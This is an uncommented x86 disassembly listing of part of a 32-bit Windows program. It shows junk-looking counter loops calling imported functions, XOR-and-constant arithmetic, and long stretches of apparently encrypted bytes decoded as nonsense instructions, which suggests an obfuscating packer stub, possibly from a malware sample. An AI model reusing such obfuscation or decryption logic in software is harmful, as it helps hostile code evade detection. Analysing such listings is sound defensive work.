  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42e913
  401863:	cmp    DWORD PTR ds:0x4302d9,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x430363,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x430363
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x430363,esi
  401898:	cmp    DWORD PTR ds:0x430363,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x430363,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e82b
  4018bd:	cmp    DWORD PTR ds:0x430363,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x430363
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x430363,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42ec57
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42ec5b,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42ec5b
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42ec5b,esi
  4018fe:	cmp    DWORD PTR ds:0x42ec5b,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ea8f
  401914:	cmp    DWORD PTR ds:0x42ec5b,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42ec5b
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42ec5b,esi
  40192e:	cmp    DWORD PTR ds:0x42ec5b,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42ec4b,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x43035b,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x43035b
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x43035b,esi
  401966:	cmp    DWORD PTR ds:0x43035b,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x43035b,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e737
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42e917
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x4302bd
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x4302b5,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x4302b5
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x4302b5,ebx
  4019c4:	cmp    DWORD PTR ds:0x4302b5,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e7c5
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e83b
  4019e5:	cmp    DWORD PTR ds:0x4302b5,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x3d37389
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401aad
  401a76:	pop    ebx
  401a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a78:	push   ebp
  401a79:	into   
  401a7a:	fidiv  WORD PTR [edx]
  401a7c:	sahf   
  401a7d:	pop    ebp
  401a7e:	cmp    al,dh
  401a80:	xor    bl,bl
  401a82:	jbe    0x401ad5
  401a84:	sub    bl,ch
  401a86:	repz mov ecx,0x128066c6
  401a8c:	rcr    DWORD PTR [edi+edi*2],1
  401a8f:	mov    ds:0xc7634050,al
  401a94:	loop   0x401a3d
  401a96:	inc    esi
  401a97:	sub    esi,DWORD PTR [edx]
  401a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a9a:	ins    DWORD PTR es:[edi],dx
  401a9b:	repz je 0x401a46
  401a9e:	loopne 0x401ace
  401aa0:	js     0x401ac7
  401aa2:	lea    edx,[ecx+0x6a5a4048]
  401aa8:	ret    
  401aa9:	or     BYTE PTR [eax],0x72
  401aac:	xchg   edi,eax
  401aad:	les    eax,FWORD PTR [esi]
  401aaf:	and    eax,0x34beb929
  401ab4:	lea    eax,[eax+0x77ccd732]
  401aba:	mov    bh,0x7f
  401abc:	jne    0x401b2f
  401abe:	pop    esp
  401abf:	xor    DWORD PTR [ebx],ecx
  401ac1:	outs   dx,BYTE PTR ds:[esi]
  401ac2:	or     cl,BYTE PTR [ebp-0x9]
  401ac5:	xor    BYTE PTR [esi+ebx*2+0x3a],bh
  401ac9:	(bad)  
  401aca:	jns    0x401af0
  401acc:	push   ds
  401acd:	iret   
  401ace:	adc    BYTE PTR [edi+0x32],ah
  401ad1:	call   0x858a:0x599a7b74
  401ad8:	adc    al,dl
  401ada:	jnp    0x401ae8
  401adc:	aam    0x47
  401ade:	daa    
  401adf:	and    esi,edx
  401ae1:	in     eax,0x12
  401ae3:	arpl   WORD PTR [ebp+0x1ad64ac7],ax
  401ae9:	retf   
  401aea:	or     BYTE PTR [esi],0xdb
  401aed:	inc    ecx
  401aee:	inc    eax
  401aef:	xchg   esi,eax
  401af0:	imul   ebp,DWORD PTR [esi-0x5bb626d2],0x7262db33
  401afa:	sub    ebp,DWORD PTR [edx]
  401afc:	mov    dl,BYTE PTR [eax-0x43b6dd7d]
  401b02:	cs (bad) 
  401b05:	jmp    0x7760:0x34a1a5b1
  401b0c:	mov    ch,0x70
  401b0e:	lods   eax,DWORD PTR ds:[esi]
  401b0f:	jge    0x401b56
  401b11:	sub    bl,BYTE PTR [ecx+edx*2]
  401b14:	add    al,0x50
  401b16:	mov    cl,0xfc
  401b18:	das    
  401b19:	pop    edx
  401b1a:	xor    esp,DWORD PTR [eax+ebp*4]
  401b1d:	fsub   st(5),st
  401b1f:	shr    BYTE PTR [ecx+0x190cb6d3],1
  401b25:	call   0x895bb529
  401b2a:	fadd   QWORD PTR [ebp-0x4e]
  401b2d:	dec    ebx
  401b2e:	ja     0x401ad8
  401b30:	xor    al,0xee
  401b32:	popa   
  401b33:	xor    BYTE PTR [esi+ebx*4],dl
  401b36:	sub    dh,BYTE PTR [ecx+0x7db02188]
  401b3c:	dec    edx
  401b3d:	jmp    0xa7821c4d
  401b42:	cmp    BYTE PTR [ecx],0x55
  401b45:	retf   0x354c
  401b48:	and    al,0x44
  401b4a:	retf   
  401b4b:	aaa    
  401b4c:	push   esp
  401b4d:	pop    eax
  401b4e:	aam    0xdc
  401b50:	add    DWORD PTR [eax+ebx*1],edx
  401b53:	pop    ecx
  401b54:	loope  0x401b5b
  401b56:	xchg   ebp,eax
  401b57:	sub    eax,0x593ea01b
  401b5c:	cmp    BYTE PTR [ebp-0x1d25f0ba],bl
  401b62:	(bad)  
  401b63:	out    0xa2,eax
  401b65:	add    BYTE PTR [edi],cl
  401b67:	xor    al,0xd6
  401b69:	retf   
  401b6a:	cmp    DWORD PTR [eax*1+0x3fa26bb],eax
  401b71:	popf   
  401b72:	xor    al,0xf9
  401b74:	add    DWORD PTR [edi+edi*1-0x1094422d],edx
  401b7b:	icebp  
  401b7c:	into   
  401b7d:	push   edx
  401b7e:	cmc    
  401b7f:	dec    esi
  401b80:	jne    0x401ba0
  401b82:	lods   al,BYTE PTR ds:[esi]
  401b83:	jecxz  0x401bdc
  401b85:	adc    edi,DWORD PTR [edx+0x23b1e301]
  401b8b:	not    BYTE PTR [esi+0x4f]
  401b8e:	mov    ah,0xb6
  401b90:	shl    BYTE PTR [ebp-0x1bdced93],0xec
  401b97:	pop    esp
  401b98:	mov    al,0xad
  401b9a:	pop    ecx
  401b9b:	inc    ebx
  401b9c:	ins    DWORD PTR es:[edi],dx
  401b9d:	xchg   edx,eax
  401b9e:	repz hlt 
  401ba0:	inc    esi
  401ba1:	pusha  
  401ba2:	or     BYTE PTR [ecx-0x28],dl
  401ba5:	loope  0x401c23
  401ba7:	pop    ss
  401ba8:	mov    ecx,0x88a5876f
  401bad:	adc    eax,0x1029da94
  401bb2:	mov    BYTE PTR [eax+0x4f],dh
  401bb5:	pop    edx
  401bb6:	mov    edx,0xbee049ab
  401bbb:	jmp    0x364a9a33
  401bc0:	iret   
  401bc1:	imul   ecx,DWORD PTR [ebp+0x25],0x38
  401bc5:	out    0x12,al
  401bc7:	je     0x401b98
  401bc9:	xor    DWORD PTR ds:[eax],eax
  401bcc:	adc    DWORD PTR [ebp+0x15],ecx
  401bcf:	mov    al,ds:0xbdce63e4
  401bd4:	imul   ebp,ebp,0x73
  401bd7:	mov    ebx,0x7aea382e
  401bdc:	mov    bh,0x46
  401bde:	inc    esi
  401bdf:	lea    edx,[ebp+eax*2+0x64]
  401be3:	push   ss
  401be4:	cmp    BYTE PTR [esp+edx*1],ch
  401be7:	loope  0x401c26
  401be9:	cdq    
  401bea:	jae    0x401c01
  401bec:	xor    bh,BYTE PTR [ebx]
  401bee:	test   BYTE PTR [ebx],dl
  401bf0:	add    dh,BYTE PTR [ebx]
  401bf2:	mov    ds:0x78c2424,al
  401bf7:	inc    ebp
  401bf8:	iret   
  401bf9:	sub    eax,0x24048dab
  401bfe:	js     0x401c26
  401c00:	sub    BYTE PTR [ebx-0x20],0x1d
  401c04:	jns    0x401bd1
  401c06:	aam    0x5d
  401c08:	pushf  
  401c09:	les    eax,FWORD PTR [edi-0x1f]
  401c0c:	ja     0x401bb4
  401c0e:	retf   0x9f89
  401c11:	mov    ch,0x2e
  401c13:	int    0x59
  401c15:	(bad)  
  401c16:	out    0x8d,al
  401c18:	js     0x401bd1
  401c1a:	arpl   WORD PTR [ebp+0x4589f445],cx
  401c20:	lock mov eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	std    
  401c91:	xchg   edx,eax
  401c92:	pop    ds
  401c93:	pop    ds
  401c94:	xor    BYTE PTR [esi],al
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401c84
  401c9d:	pushf  
  401c9e:	shr    DWORD PTR [esi+0x6b1163d0],1
  401ca4:	outs   dx,DWORD PTR ds:[esi]
  401ca5:	fnstcw WORD PTR [ebp-0x29]
  401ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ca9:	or     esp,ebx
  401cab:	test   BYTE PTR [ebx-0x62f1a4e0],bh
  401cb1:	jmp    0xcb80:0x4bc51506
  401cb8:	call   0x7211d1fa
  401cbd:	xlat   BYTE PTR ds:[ebx]
  401cbe:	and    ebp,edx
  401cc0:	xor    eax,0x13f7f627
  401cc5:	sbb    esi,DWORD PTR [eax-0x62]
  401cc8:	inc    ecx
  401cc9:	and    ecx,DWORD PTR [ebp-0x38620103]
  401ccf:	jecxz  0x401d38
  401cd1:	std    
  401cd2:	hlt    
  401cd3:	jmp    FWORD PTR [ecx+ebp*4+0x52]
  401cd7:	or     edi,ebp
  401cd9:	leave  
  401cda:	gs xchg ebx,eax
  401cdc:	mov    ah,bl
  401cde:	rcl    DWORD PTR [ebp-0x53],cl
  401ce1:	sbb    al,0x5e
  401ce3:	int    0xf5
  401ce5:	adc    BYTE PTR [ebx+0x7f88ff53],bl
  401ceb:	test   dl,ch
  401ced:	cli    
  401cee:	xor    BYTE PTR [ebp-0x47],bl
  401cf1:	dec    ebx
  401cf2:	aad    0x0
  401cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cf5:	push   edx
  401cf6:	inc    edx
  401cf7:	es popa 
  401cf9:	xor    ch,BYTE PTR [esi+0x50]
  401cfc:	shl    DWORD PTR [esi],0x18
  401cff:	(bad)  
  401d01:	push   ebp
  401d02:	imul   edx,DWORD PTR [esi],0x573fd438
  401d08:	ins    DWORD PTR es:[edi],dx
  401d09:	pop    esi
  401d0a:	adc    bh,al
  401d0c:	inc    ebp
  401d0d:	sub    eax,0x7cee2653
  401d12:	in     al,dx
  401d13:	mov    ds:0xc91ed94c,eax
  401d18:	lods   al,BYTE PTR ds:[esi]
  401d19:	stc    
  401d1a:	lock cld 
  401d1c:	(bad)  
  401d1d:	sub    DWORD PTR [bp+si-0x73],ebx
  401d21:	fwait
  401d22:	sar    bl,cl
  401d24:	or     eax,0xa805457a
  401d29:	stc    
  401d2a:	sbb    eax,0x2193d04e
  401d2f:	fcomp  QWORD PTR [ecx+0x615f5205]
  401d35:	jl     0x401d48
  401d37:	push   ebp
  401d38:	and    edx,0xffffffdf
  401d3b:	rcr    BYTE PTR [ebx+0x48eafb50],cl
  401d41:	lock mov ebp,0xd946ec52
  401d47:	fisttp QWORD PTR [edi]
  401d49:	xor    DWORD PTR [eax],0x8da8c46a
  401d4f:	ret    0x40d6
  401d52:	cmp    BYTE PTR [edi+eax*2+0x77],dh
  401d56:	cmp    ebx,esp
  401d58:	pop    esp
  401d59:	inc    ebx
  401d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d5b:	xchg   ecx,edi
  401d5d:	mov    ebx,?
  401d5f:	sub    al,0xea
  401d61:	push   cs
  401d62:	xchg   edx,eax
  401d63:	dec    eax
  401d64:	sbb    ebx,DWORD PTR [ecx]
  401d66:	xrelease mov BYTE PTR [ebx-0x2e48ad51],bl
  401d6d:	dec    ebp
  401d6e:	cli    
  401d6f:	aas    
  401d70:	out    dx,eax
  401d71:	mov    dl,0xf7
  401d73:	xchg   BYTE PTR [edx-0x38666463],ah
  401d79:	xchg   esp,eax
  401d7a:	dec    ecx
  401d7b:	pmulhuw mm4,QWORD PTR [eax]
  401d7e:	mov    al,0x11
  401d80:	push   edx
  401d81:	fwait
  401d82:	retf   0xe752
  401d85:	mov    edx,0x89536ca8
  401d8a:	adc    eax,0x4eaf6d5a
  401d8f:	add    DWORD PTR [edx],edi
  401d91:	imul   eax,DWORD PTR [ecx],0xe6d63bf8
  401d97:	cmp    ecx,DWORD PTR [esi+ecx*4]
  401d9a:	xchg   edx,eax
  401d9b:	test   al,0xe9
  401d9d:	xchg   ecx,eax
  401d9e:	inc    eax
  401d9f:	in     al,dx
  401da0:	fstp   st(5)
  401da2:	ja     0x401d5a
  401da4:	adc    edx,ebx
  401da6:	into   
  401da7:	fnsetpm(287 only) 
  401da9:	enter  0xf200,0xad
  401dad:	sub    eax,0x85005542
  401db2:	in     eax,dx
  401db3:	and    ebx,ecx
  401db5:	pushf  
  401db6:	jmp    0xf220:0xb81f39d4
  401dbd:	mov    dh,0xcb
  401dbf:	add    DWORD PTR [ecx],eax
  401dc1:	inc    esp
  401dc2:	sahf   
  401dc3:	mov    ds:0x8f436279,eax
  401dc8:	mov    WORD PTR [eax-0x6],fs
  401dcb:	aad    0xba
  401dcd:	ins    DWORD PTR es:[edi],dx
  401dce:	jnp    0x401e4d
  401dd0:	popa   
  401dd1:	(bad)  
  401dd2:	mov    ds:0x6f585cee,eax
  401dd7:	inc    ebx
  401dd8:	test   al,0x99
  401dda:	xor    cl,dh
  401ddc:	(bad)  
  401ddd:	jbe    0x401da0
  401ddf:	in     al,0xed
  401de1:	(bad)  
  401de2:	arpl   WORD PTR [edi+esi*2-0x2f],ax
  401de6:	sti    
  401de7:	inc    eax
  401de8:	adc    DWORD PTR [ebp-0x2a],esp
  401deb:	add    al,0x40
  401ded:	lds    edx,FWORD PTR [ecx]
  401def:	mov    edi,0xedac48eb
  401df4:	call   0x62908cc7
  401df9:	fcmove st,st(1)
  401dfb:	mov    ebp,0x11d2ccf5
  401e00:	ds or  al,0x57
  401e03:	cmp    eax,0xa5cd1f7b
  401e08:	test   BYTE PTR [edi+esi*4+0x35],cl
  401e0c:	mov    edx,0xe5a4e785
  401e11:	test   eax,0x30a4103b
  401e16:	mov    DWORD PTR ds:0xf4bbecfc,eax
  401e1c:	addr16 lahf 
  401e1e:	ret    
  401e1f:	loop   0x401e0a
  401e21:	jg     0x401dcf
  401e23:	cmp    al,0x26
  401e25:	xchg   ebx,eax
  401e26:	loop   0x401e7f
  401e28:	aaa    
  401e29:	sti    
  401e2a:	mov    cl,0xf6
  401e2c:	mov    bl,BYTE PTR [ecx-0x5d]
  401e2f:	popa   
  401e30:	or     eax,0x709a6def
  401e35:	ficom  DWORD PTR [ebx+0xb3baf5e]
  401e3b:	pop    esp
  401e3c:	jmp    0x8142:0x45d4f3c
  401e43:	xor    BYTE PTR [edi-0x16d9af06],cl
  401e49:	push   edi
  401e4a:	add    al,BYTE PTR [eax]
  401e4c:	add    BYTE PTR [esi-0x75],ah
  401e4f:	inc    ebp
  401e50:	cld    
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	cld    
  401e81:	out    0xc4,eax
  401e83:	icebp  
  401e84:	pop    edx
  401e85:	pop    es
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401f03
  401e8d:	or     DWORD PTR [ebx],0x419473d5
  401e93:	jbe    0x401e63
  401e95:	pop    ecx
  401e96:	div    BYTE PTR [esi-0x76]
  401e99:	push   ds
  401e9a:	(bad)  
  401e9c:	jle    0x401eea
  401e9e:	xor    cl,BYTE PTR [ebx]
  401ea0:	push   ds
  401ea1:	xchg   ecx,eax
  401ea2:	cmp    ecx,esp
  401ea4:	rol    BYTE PTR [edi],0x4a
  401ea7:	add    al,0x8
  401ea9:	xor    esp,DWORD PTR [edi-0x3c]
  401eac:	push   edx
  401ead:	push   esp
  401eae:	jne    0x401ec1
  401eb0:	push   es
  401eb1:	ds pop esi
  401eb3:	leave  
  401eb4:	pop    ebp
  401eb5:	add    esi,DWORD PTR [ebp-0x3c]
  401eb8:	fbstp  TBYTE PTR [ecx-0x3914bee8]
  401ebe:	popf   
  401ebf:	push   ebp
  401ec0:	xchg   esi,eax
  401ec1:	stos   DWORD PTR es:[edi],eax
  401ec2:	bound  si,DWORD PTR [eax+eiz*4+0x5fcd884c]
  401eca:	push   ebp
  401ecb:	jmp    0x19cd:0xee944ff1
  401ed2:	or     cl,BYTE PTR [ebx-0x46]
  401ed5:	cmp    eax,0x580c04bf
  401eda:	dec    esp
  401edb:	and    edi,edx
  401edd:	pavgb  mm3,QWORD PTR [eax+0x543c6e66]
  401ee4:	test   DWORD PTR [ebx+0x25],0xaf06b0a
  401eeb:	loopne 0x401f62
  401eed:	jb     0x401f6d
  401eef:	or     al,0x7f
  401ef1:	sub    al,0x37
  401ef3:	imul   ebp,DWORD PTR [ebx-0x73],0x6f
  401ef7:	cli    
  401ef8:	pop    esp
  401ef9:	pop    esi
  401efa:	jb     0x401f74
  401efc:	orps   xmm1,XMMWORD PTR ss:[ebp+0x1]
  401f01:	dec    eax
  401f02:	retf   0xb298
  401f05:	ret    
  401f06:	sar    BYTE PTR [edi],1
  401f08:	mov    ch,0x59
  401f0a:	mov    cl,0xb4
  401f0c:	(bad)  
  401f0d:	in     eax,0x37
  401f0f:	imul   ebp,edx,0x5087764e
  401f15:	data16 xlat BYTE PTR ds:[ebx]
  401f17:	push   ecx
  401f18:	mov    edi,0x355776cf
  401f1d:	ret    
  401f1e:	mov    ebp,0x6293984c
  401f23:	aad    0x82
  401f25:	(bad)  [eax-0x71]
  401f28:	sub    ah,BYTE PTR [eax+0xb]
  401f2b:	mov    ds:0x68052e99,eax
  401f30:	push   edi
  401f31:	(bad)  
  401f32:	adc    bl,BYTE PTR [edi+esi*1+0x8267dd4]
  401f39:	push   es
  401f3a:	inc    edi
  401f3b:	lock mov al,ds:0x3540b162
  401f41:	inc    edi
  401f42:	push   cs
  401f43:	es pop ebx
  401f45:	and    eax,0x3efd9ba3
  401f4a:	ins    BYTE PTR es:[edi],dx
  401f4b:	add    DWORD PTR [edx+0x6949b152],ebp
  401f51:	jmp    0x59a3:0x1232fd6
  401f58:	dec    ecx
  401f59:	ins    BYTE PTR es:[edi],dx
  401f5a:	push   es
  401f5b:	add    eax,0xa9f6d59f
  401f60:	enter  0x2eed,0x94
  401f64:	cs enter 0x1e7f,0x50
  401f69:	lds    esi,FWORD PTR [edi-0x149df6e]
  401f6f:	add    edi,0xffffff9b
  401f72:	das    
  401f73:	(bad)  
  401f74:	cmc    
  401f75:	jo     0x401f03
  401f77:	mov    ds:0xb533c86b,al
  401f7c:	push   ds
  401f7d:	pushf  
  401f7e:	and    eax,0xf8e81ea0
  401f83:	mov    ebx,0x40184b7d
  401f88:	add    edi,DWORD PTR [ecx-0x31]
  401f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f8c:	sub    edx,esi
  401f8e:	pop    edi
  401f8f:	mov    BYTE PTR [esi],bh
  401f91:	cwde   
  401f92:	xor    BYTE PTR [esi+0x13],ah
  401f95:	call   0x5aa1:0xd03368c7
  401f9c:	pusha  
  401f9d:	into   
  401f9e:	push   ebp
  401f9f:	jl     0x401fc9
  401fa1:	std    
  401fa2:	mov    eax,0xc9e49451
  401fa7:	cmp    ch,BYTE PTR [esi-0x69]
  401faa:	fldenv [esi+0x1f]
  401fad:	mov    esi,0x4015981d
  401fb2:	cmp    DWORD PTR [eax+eax*8-0x7d],esp
  401fb6:	repz pop ebx
  401fb8:	inc    eax
  401fb9:	sub    edi,ecx
  401fbb:	imul   esi,DWORD PTR [edx-0x69],0x0
  401fbf:	cwde   
  401fc0:	xchg   edx,eax
  401fc1:	repnz pusha 
  401fc3:	xchg   edi,eax
  401fc4:	sbb    DWORD PTR [edx-0x17],esi
  401fc7:	adc    BYTE PTR [edi+0x37],dh
  401fca:	push   ss
  401fcb:	ins    BYTE PTR es:[edi],dx
  401fcc:	cmovle esp,esp
  401fcf:	add    dl,0xb9
  401fd2:	adc    DWORD PTR [edx+0x45],ecx
  401fd5:	and    ah,BYTE PTR [ecx+ecx*2-0x6a]
  401fd9:	jecxz  0x401fe4
  401fdb:	xchg   DWORD PTR [eax+0x3908c418],esi
  401fe1:	xchg   ecx,eax
  401fe2:	mov    eax,ds:0xb861a164
  401fe7:	xchg   ebp,eax
  401fe8:	popf   
  401fe9:	sti    
  401fea:	add    BYTE PTR [ebx-0x1b],cl
  401fed:	inc    eax
  401fee:	lea    esi,[ebx+0x65fc7c2f]
  401ff4:	fild   DWORD PTR [esi+0x43]
  401ff7:	lahf   
  401ff8:	dec    eax
  401ff9:	mov    BYTE PTR [esi+0x1288ef62],0xa7
  402000:	daa    
  402001:	jno    0x401f86
  402003:	mov    dh,0xc
  402005:	pop    edi
  402006:	stos   BYTE PTR es:[edi],al
  402007:	mov    ch,0x5b
  402009:	add    DWORD PTR [ebx],0xffffff82
  40200c:	mov    esi,0xbaa0039d
  402011:	jg     0x40207c
  402013:	mov    ch,0x69
  402015:	cld    
  402016:	das    
  402017:	xchg   esp,eax
  402018:	inc    DWORD PTR ds:[ecx]
  40201b:	mov    ebp,cs
  40201d:	(bad)  
  40201e:	test   BYTE PTR [esi+ecx*8+0x746f1fe8],al
  402025:	mov    esp,0xcc0ab0fa
  40202a:	push   edi
  40202b:	xor    esp,edx
  40202d:	test   eax,0x8c3ea492
  402032:	add    eax,esi
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	es xchg ecx,eax
  4020e6:	xchg   cl,ah
  4020e8:	test   BYTE PTR ds:0x7f557e7e,al
  4020ee:	jle    0x40216e
  4020f0:	test   al,0xc1
  4020f2:	clc    
  4020f3:	lods   eax,DWORD PTR ds:[esi]
  4020f4:	xchg   ebx,eax
  4020f5:	loopne 0x402099
  4020f7:	pushf  
  4020f8:	xchg   ebp,eax
  4020f9:	mov    al,0x76
  4020fb:	fdiv   QWORD PTR [ebx]
  4020fd:	xchg   ebp,eax
  4020fe:	mov    edx,?
  402100:	jno    0x402110
  402102:	rcr    BYTE PTR [ebx],cl
  402104:	sub    ebp,DWORD PTR [ebp-0x63d7ec14]
  40210a:	mov    ds:0x3dcd511b,al
